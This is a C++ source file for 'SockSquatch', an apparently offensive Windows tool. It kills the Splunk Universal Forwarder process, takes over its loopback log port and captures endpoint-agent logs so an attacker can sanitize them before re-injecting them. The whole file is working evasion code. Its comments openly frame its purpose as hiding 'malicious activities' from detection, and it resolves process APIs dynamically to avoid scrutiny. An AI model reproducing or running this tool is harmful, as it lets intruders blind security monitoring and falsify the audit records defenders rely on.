// SockSquatch.cpp
// 
// SockSquatch intercepts TCP logs ingested by splunkd (Splunk Universal Forwarder) on localhost from other endpoint agents for sanitization to avoid detection
// Logs which are intercepted can be written to a custom file as-is for manual sanitization and appending to Splunk tcpin file
// Logs can alternatively be written directly to the Splunk tcpin file if you do not want to sanitize them first (not recommended)
// When finished with malicious activities kill SockSquatch, it will handle the sig int gracefully and cleanup/close the sockets
// Restart SplunkForwarder service and ensure splunkd.exe is listening on localhost:19500, it will not recover on its own and log flow will stop (may burn you)
//


#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <signal.h>
#include <process.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#pragma comment(lib,"ws2_32.lib")
namespace fs = std::filesystem;


// --- RTL --- START ---------------------------------------------------------------------------- 
// OpenProcess
using OpenProcessPrototype = HANDLE(WINAPI*)(DWORD, BOOL, DWORD);
// CreateToolhelp32Snapshot
using CreateToolhelp32SnapshotPrototype = HANDLE(WINAPI*)(DWORD, DWORD);
// Process32First  
using Process32FirstPrototype = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32);
// Process32Next 
using Process32NextPrototype = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32);
// CloseHandle  
using CloseHandlePrototype = BOOL(WINAPI*)(HANDLE);
// --- RTL --- END ---------------------------------------------------------------------------- 


// Port where splunkd listens on loopback to accept TCP logs from uberAgent
const int bindPort = 19500;

// find pid by name helper func from shellcode loader project
int findProcessId(const char* procname) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
	if (hKernel32 == NULL)
	{
		return true;
	}

	CreateToolhelp32SnapshotPrototype CreateToolhelp32Snapshot = (CreateToolhelp32SnapshotPrototype)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
	Process32FirstPrototype Process32First = (Process32FirstPrototype)GetProcAddress(hKernel32, "Process32First");
	Process32NextPrototype Process32Next = (Process32NextPrototype)GetProcAddress(hKernel32, "Process32Next");
	CloseHandlePrototype CloseHandle = (CloseHandlePrototype)GetProcAddress(hKernel32, "CloseHandle");

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	if (lstrcmpiA(procname, (const char*)pe32.szExeFile) == 0) {
		pid = pe32.th32ProcessID;
		CloseHandle(hProcSnap);
		return pid;
	}

	while (Process32Next(hProcSnap, &pe32)) {
		if (strcmp(procname, (const char*)pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}
	CloseHandle(hProcSnap);

	return pid;
}

// Var init
WSADATA wsa;
SOCKET s, new_socket;
struct sockaddr_in server, client;
int c;
char* replyMessage;

// For handling SIG_INT gracefully
void INThandler(int);
int sigInt = 0;


// To handle each connection
unsigned __stdcall clientSession(void* data)
{
	// Var init
	SOCKET AcceptSocket = (SOCKET)data;
	int bytesSent;
	int bytesRecv = SOCKET_ERROR;
	char sendbuf[2048] = "";
	char recvbuf[2048] = "";
	int recvbuflen = 2048;
	replyMessage = (char*)"splunkd can't come to the phone right now, but if you'd like to leave a message...\n";

	// Reply to client
	printf("[+] New client connection accepted\n");
	bytesSent = send(AcceptSocket, replyMessage, strlen(replyMessage), 0);
	if (bytesSent == SOCKET_ERROR)
	{
		//printf("Error at send hello: %ld\n", WSAGetLastError());
		goto fin;
	}

	// Main client session while loop
	while (!sigInt)
	{
		//_strtime_s(timebuf);
		ZeroMemory(recvbuf, sizeof(recvbuf));

		// Try to receive data from client
		// Increased the buffer size to try to avoid fragmentation which is breaking string match/replace
		bytesRecv = recv(AcceptSocket, recvbuf, recvbuflen, 0);
		if (bytesRecv == SOCKET_ERROR)
		{
			//printf("Error at recv: %ld\n", WSAGetLastError());
			goto fin;
		}

		// Avoids copying garbage data by only copying num of bytes read from buf vs copying the full char size
		std::string bufString(recvbuf, bytesRecv);

		// Path to write to (sanitize data manually / append to Splunk tcpin file manually)
		// Should point to parent dir which contains a single file, code will pull the file name dynamically
		std::string tcpFileDir = "C:\\tcpin";

		// Or if you want to append directly to the Splunk tcpin file, it is located here (not reccommended, you should write elsewhere and santize/append manually)
		// std::string tcpFileDir = "C:\\Program Files\\SplunkUniversalForwarder\\var\\run\\splunk\\tcpin";
	
		// Var to store the full path to the single file in the parent dir as defined above
		std::string tcpFilePath;
		
		// Get the path to the semi-random named Splunk tcp queue file which should be the only file in this dir
		for (const auto& entry : fs::directory_iterator(fs::path(tcpFileDir)))
		{
			// Break on first file found
			tcpFilePath = entry.path().string();
			break;
		}

		// Write the buffer contents, sanitized if enabled, to the location specified above
		std::ofstream outfile;
		outfile.open(tcpFilePath, std::ios::app);
		outfile << bufString;
		outfile.close();

		// Send our reply again
		bytesSent = send(AcceptSocket, replyMessage, strlen(replyMessage), 0);
		if (bytesSent == SOCKET_ERROR)
		{
			//printf("Error at send: %ld\n", WSAGetLastError());
			goto fin;
		}
	}

	goto fin;

	fin:
		closesocket(AcceptSocket);
		return 0;
}


int main(int argc, char* argv[])
{

	// Winsock init
	printf("[+] Initializing Winsock\n");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("[!] Init failed : %d", WSAGetLastError());
		printf("\n");
		exit(0);
	}

	printf("[+] Init success\n");

	// Create socket
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		printf("[!] Create failed : %d", WSAGetLastError());
		printf("\n");
		exit(0);
	}

	printf("[+] Socket create success\n");

	// For handling SIG_INT gracefully, need to clean up WSA and socket
	signal(SIGINT, INThandler);

	// Prepare sockaddr_in structure
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons(bindPort);

	// Attempt bind
	printf("[+] Attempting to bind to port\n");
	if (bind(s, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR)
	{
		// Bind failed, probably port already in use by Splunk
		printf("[!] Bind failed : %d", WSAGetLastError());
		printf("\n");

		// Look for the Splunk process
		printf("[+] Searching for splunkd process\n");
		int splunkPid = findProcessId("splunkd.exe");
		if (splunkPid != 0)
		{
			// RTL
			HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
			if (hKernel32 == NULL)
			{
				return true;
			}

			OpenProcessPrototype OpenProcess = (OpenProcessPrototype)GetProcAddress(hKernel32, "OpenProcess");

			// Kill the Splunk process
			printf("[+] Process found, getting handle\n");
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, (DWORD)splunkPid);
			if (hProcess != NULL)
			{
				printf("[+] Got handle, attempting to kill\n");
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
				printf("[+] Goodbye Spunk!\n");
			}
			else
			{
				printf("[!] Failed to get handle\n");
			}
		}

		// Keep trying to bind to the port so we grab it ASAP before service recovery restarts splunkd
		printf("[+] Retrying to see if bind is possible now\n");
		int i = 0;
		while (bind(s, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR && i < 5)
		{
			// Bind failed, sleep and retry
			printf("[!] Bind failed : %d", WSAGetLastError());
			printf("\n");
			printf("[+] Sleeping 1 sec before retry\n");
			Sleep(1 * 1000);
			i++;
		}
	}

	// Bind success
	printf("[+] Bind success\n");

	// Start loop to listen for and handle incoming connections
	printf("[+] Listening for connections\n");
	listen(s, 3);
	c = sizeof(struct sockaddr_in);

	while (!sigInt)
	{
		// Try to accept incoming data
		new_socket = SOCKET_ERROR;
		while (new_socket == SOCKET_ERROR)
		{
			new_socket = accept(s, (struct sockaddr*)&client, &c);
		}

		// Create new thread for client session so avoid a busy server situation
		unsigned threadID;
		HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, &clientSession, (void*)new_socket, 0, &threadID);
	}
}

// For handling SIG_INT gracefully
void  INThandler(int sig)
{
	// Let the while loop die
	signal(sig, SIG_IGN);
	sigInt = 1;
	Sleep(1 * 1000);

	// Cleanup
	closesocket(s);
	WSACleanup();

	exit(0);
}
